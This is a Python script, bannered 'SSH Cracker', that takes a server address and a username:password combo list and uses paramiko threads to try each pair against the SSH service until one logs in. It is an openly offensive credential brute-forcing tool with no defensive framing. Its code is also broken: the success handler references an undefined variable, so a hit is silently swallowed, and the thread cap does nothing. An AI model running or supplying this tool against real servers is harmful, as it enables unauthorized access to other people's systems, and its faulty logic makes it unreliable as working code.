import paramiko
import threading
import os
import sys
import warnings
import time

ssh_creds = []

err = None
pwd = None

active = 0

lock = threading.Lock() # avoid race-conditions

def login(host, port, username, password, tout):
    global active, pwd
    
    with lock:
        active += 1
    
    try:
        # create ssh client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        #attempt connection
        client.connect(host, port=port, username=username, password=password, timeout=int(tout))
        
        pwd = usr + ":" + pwd
    except:
        pass
    finally:
        with lock:
            active -= 1

def main():
    global ssh_creds, err, active
    
    # capture user-input
    while True:
        os.system('clear')
        
        # display banner
        print('''
  ____ _____   _    _____               _             
 / __// __/ | | |  / ___/_ _____ _  ___| | _______ ___ 
 \ \  \ \ | |_| | | |   | '__/ _` |/ __| |/ / _ \ '__/
__\ \__\ \|  _  | | |___| | | (_| | (__|   <  __/ |   
\___/\___/|_| |_|  \____\_|  \__,_|\___|_|\_\___|_|   
''')
    
        #verbose error output
        if err != None:
            print(f'Try again! Error: {err}\r\n')
            err = None
    
        try:
            host = input('Server IP: ')
            port = int(input('SSH Port (default 22): '))
        
            list = input('Combo-list (ex- /tmp/creds.txt): ')
            
            # import combo-list
            with open(list, "r") as f:
                for line in f:
                    line = line.strip()
                    
                    # if format is correct...
                    if ':' in line:
                        username, password = line.split(':', 1)
                        
                        # add to dictionary
                        ssh_creds.append((username, password))
                        
            # ensure dictionary isnt empty
            if not ssh_creds:
                err = "No valid credentials imported from list!"
                continue
                        
            tcount = int(input('Amount of threads (default 10): '))
            
            tout = int(input('Connection timeout (seconds): '))
            
            wait = float(input('Millisecond wait (default 100|0=None): '))
        
            # attack confirmation
            input('\r\nReady? Strike ENTER to crack and CTRL+C to abort...\r\n')
        
            break
        except KeyboardInterrupt:
            sys.exit()
        except:
            pass

    # conduct the attack
    
    print('!!! Cracking !!! Stand-by for results !!!\r\n')

    try:
        for username, password in ssh_creds:
        
            x = threading.Thread(target=login, args=(host,port,username,password,tout))
            x.daemon = True
            x.start()
            
            # millisecond pause
            if wait != 0:
                time.sleep(wait / 1000)
        
            if pwd:
                print(f'\r\nLogin successful @ {pwd}\r\n')
                break
            
            # respect thread-cap
            if active >= tcount:
                pass
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        sys.exit(e)

if __name__ == '__main__':
    main()
